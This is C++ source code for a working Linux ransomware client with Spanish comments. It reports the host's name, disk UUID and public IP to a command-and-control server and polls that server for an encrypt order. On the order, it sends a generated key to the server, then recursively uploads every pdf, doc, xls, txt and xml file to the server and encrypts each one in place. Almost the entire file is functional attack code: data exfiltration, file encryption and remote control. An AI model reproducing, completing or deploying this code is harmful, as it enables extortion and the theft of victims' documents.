#include <iostream>
#include <fstab.h>
#include <nlohmann/json.hpp>
#include <stdio.h>

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "lib/httplib.h"
#include "lib/aes.h"

#include <string>
#include <dirent.h>

typedef struct {
    std::string Public_IP;
    std::string Private_IP;

    std::string Hostname;
    std::string UUID;
    int Encrypted = 0;
    std::string passwd;
} InfoLinux;

typedef struct {
    int to_encrypt = 0;
} InfoServer;

InfoLinux dataG;
InfoServer Orders;
std::string server = "127.0.0.1:5000";



std::string randomstring(int n)
{
    char letters[26] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q',
                              'r','s','t','u','v','w','x',
                              'y','z'};
    std::string ran = "";
    srand(time(0));
    for (int i=0;i<n;i++)
        ran=ran + letters[rand() % 26];
    return ran;
}

void encryptFile(std::string path, std::string passwd){
    const unsigned char* k =(const unsigned char*) passwd.c_str();
    encrypt_decrypt_file(path.c_str(),"encrypt",k);

}

void uploadFile(std::string uuid, std::string path){

    // get full path
    char auxPath[1024];
    realpath(path.c_str(),auxPath);
    path = auxPath;

    std::string url = "/device/" + uuid + "/upload";
    std::ifstream file(path);
    std::stringstream fileStr;
    fileStr << file.rdbuf();


    httplib::Client cliSendFiles(server);
    httplib::MultipartFormDataItems items = {
            {path, fileStr.str(), "file", "application/octet-stream"},
    };
    auto resSendFiles = cliSendFiles.Post(url.c_str(), items);
    std::cout << resSendFiles->status << std::endl;


}


std::string GetStdoutFromCommand(const std::string cmd) {
    std::string data;
    FILE * stream;
    const int max_buffer = 256;

    char buffer[max_buffer];
    stream = popen(cmd.c_str(), "r");

    if (stream) {
        while (!feof(stream))
            if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
        pclose(stream);
    }
    return data;
}


void getInfoLinux(InfoLinux *data){
    // populate hostname and UUID
    char auxHostname[1024];
    gethostname(auxHostname,1024);
    data->Hostname = auxHostname;

    // this should go with the disk uuid of the root filesystem

    // 1-get disk where root is mounted
     fstab *x = getfsfile("/");
     std::string device = x->fs_spec;

     // 2-get uuuid of disk
    std::string ret = GetStdoutFromCommand( R"(blkid 2> /dev/null | grep /dev/mapper/sdb2_crypt 2> /dev/null | cut -d"\"" -f2 2> /dev/null)");
    ret = ret.substr(0,ret.length()-1);

//    std::cout << ret << std::endl;

    data->UUID = ret;

    // get public ip
    std::string ip = GetStdoutFromCommand("nslookup myip.opendns.com resolver1.opendns.com | grep Address: | cut -d\" \" -f2 | tail -n 1");
    ip = ip.substr(0,ip.length()-1);
    data->Public_IP = ip;

    // get private ip
    data->Private_IP = "192.168.1.237";

}

// serialize data without
std::string serializeLinux(InfoLinux *data){
    std::cout << "test";
    nlohmann::json j;
    j["HOSTNAME"] = data->Hostname;
    j["ENCRYPTED"] = data->Encrypted;
    j["PUBLIC_IP"] = data->Public_IP;
    j["PRIVATE_IP"] = data->Private_IP;
    j["PASSWD"] = data->passwd;

    //std::string ret= "{\"HOSTNAME\": \"" + data->Hostname + ",\"ENCRYPTED\":"+ enc +"\"}";
    std::cout << to_string(j);
    return to_string(j);
}

// sends Info Linux data structure to server
void sendInfo(InfoLinux *data){
    std::string url = "/device/" + data->UUID;

    std::string toSend = serializeLinux(data);

    httplib::Client cli(server);
    httplib::Result  res =  cli.Post(url.c_str(),toSend.c_str(), "application/json");
    //std::cout << res->status << std::endl;
}

// gets Info Server data structure from server
InfoServer queryOrders(std::string uuid){

    std::string url = "/device/" + uuid;
    InfoServer ret;


    httplib::Client cli(server);
    httplib::Result res = cli.Get(url.c_str());

    std::string body = res->body;
    nlohmann::json j = nlohmann::json::parse(body);
    ret. to_encrypt = j["ENCRIPTAR"];
   // std::cout << ret.to_encrypt << std::endl;
    return ret;

}
void generatePasswd(){
    dataG.passwd = randomstring(25);
}


int archivoCifrable(const char* path){
    std::cout << "cifrable" << std::endl;
    std::string f = path;

    std::string ext = f.substr(f.find_last_of(".") + 1);
    std::cout << f;
    if (ext == "pdf" || ext  == "doc" || ext == "xls" || ext == "txt" || ext == "xml") {

        return 1;
    } else {
    return 0;
}
}

static void encDirRec (const char * dir_name)
{
    DIR * d;

    /* Open the directory specified by "dir_name". */

    d = opendir (dir_name);

    /* Check it was opened. */
    if (! d) {
        //printf (stderr, "Cannot open directory '%s': %s\n",
        //         dir_name, strerror (errno));
        exit (EXIT_FAILURE);
    }
    while (1) {
        struct dirent * entry;
        const char * d_name;

        /* "Readdir" gets subsequent entries from "d". */
        entry = readdir (d);
        if (! entry) {
            /* There are no more entries in this directory, so break
               out of the while loop. */
            break;
        }
        d_name = entry->d_name;
        /* Print the name of the file and directory. */
        printf ("%s/%s\n", dir_name, d_name);
        std::string p = std::string(dir_name)+"/"+std::string(d_name);
        if(archivoCifrable(p.c_str())){
            
           
            // enviar archivo
            uploadFile(dataG.UUID, p);
		// cifrar archivo
		 encryptFile(p, dataG.passwd);
        }

#if 0
        /* If you don't want to print the directories, use the
	   following line: */

        if (! (entry->d_type & DT_DIR)) {
	    printf ("%s/%s\n", dir_name, d_name);
	}

#endif /* 0 */


        if (entry->d_type & DT_DIR) {

            /* Check that the directory is not "d" or d's parent. */

            if (strcmp (d_name, "..") != 0 &&
                strcmp (d_name, ".") != 0) {
                int path_length;
                char path[PATH_MAX];

                path_length = snprintf (path, PATH_MAX,
                                        "%s/%s", dir_name, d_name);
                //printf ("%s\n", path); LLEGAMOS AL ARCHIVO


                if (path_length >= PATH_MAX) {
                //    fprintf (stderr, "Path length has got too long.\n");
                    exit (EXIT_FAILURE);
                }
                /* Recursively call "encDirRec" with the new path. */
                encDirRec(path);
            }
        }
    }
    /* After going through all the entries, close the directory. */
    if (closedir (d)) {
        //fprintf (stderr, "Could not close '%s': %s\n",
        //         dir_name, strerror (errno));
        exit (EXIT_FAILURE);
    }
}
void encryptAndSend(std::string path){
    encDirRec(path.c_str());
}

int main() {
    // asumimos linux
    getInfoLinux(&dataG);
    sendInfo(&dataG);

    for(;;){
        Orders = queryOrders(dataG.UUID);
//        std::cout << Orders.to_encrypt << std::endl;
        if (Orders.to_encrypt && !dataG.Encrypted){
            generatePasswd();
            sendInfo(&dataG); // enviamos contraseña

            encryptAndSend("/test"); // enviamos archivos encriptados
            dataG.Encrypted = 1;
            sendInfo(&dataG);  // confirmamos fin envio datos
        }
        sleep(1);
    }
}

